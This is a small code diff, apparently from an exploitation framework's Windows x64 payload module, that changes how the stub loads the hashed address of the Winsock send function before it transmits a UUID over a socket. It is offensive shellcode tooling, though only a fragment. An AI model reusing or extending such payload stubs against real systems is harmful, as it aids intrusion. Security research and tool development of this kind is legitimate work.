@@ -30,7 +30,7 @@ module Payload::Windows::SendUUID_x64
       get_uuid_address:
         pop rdx                ; UUID address
         mov rcx, rdi           ; Socket handle
-        mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'send')}
         call rbp               ; call send
     ^
 
